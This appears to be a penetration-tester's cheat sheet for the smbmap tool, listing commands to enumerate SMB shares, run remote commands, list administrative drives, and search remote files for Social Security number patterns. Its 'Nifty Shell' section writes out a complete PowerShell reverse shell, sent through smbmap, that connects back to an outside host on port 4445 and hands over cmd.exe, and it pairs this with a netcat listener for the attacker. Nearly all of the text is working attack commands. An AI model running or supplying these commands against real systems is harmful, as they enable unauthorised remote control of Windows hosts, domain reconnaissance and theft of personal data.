# Summary
```zsh
Smbmap for domains (List share drives, drive permissions, share contents, upload/download functionality..)
```

# Usage
## Basic enumeration (password or NTLM hash)
```zsh
smbmap -u jsmith -p password1 -d workgroup -H 192.168.0.1
```

# Remote command execution
```zsh
smbmap -u 'apadmin' -p 'asdf1234!' -d ACME -H 10.1.3.30 -x 'net group "Domain Admins" /domain'
```

## Non-recursive path listing
```zsh
smbmap -H 172.16.0.24 -u Administrator -p 'changeMe' -r 'C$\Users'
```

## File content searching
```zsh
smbmap --host-file ~/Desktop/smb-workstation-sml.txt -u NopSec -p 'NopSec1234!' -d widgetworld -F '[1-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9][0-9][0-9]'
```
## Drive listing
```zsh
smbmap -H 192.168.1.24 -u Administrator -p 'R33nisP!nckle' -L 
```

## Nifty Shell
```zsh
smbmap -u jsmith -p 'R33nisP!nckle' -d ABC -H 192.168.2.50 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""1.1.1.1""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"' 
```

## Attackers
```zsh
nc -l 4445
```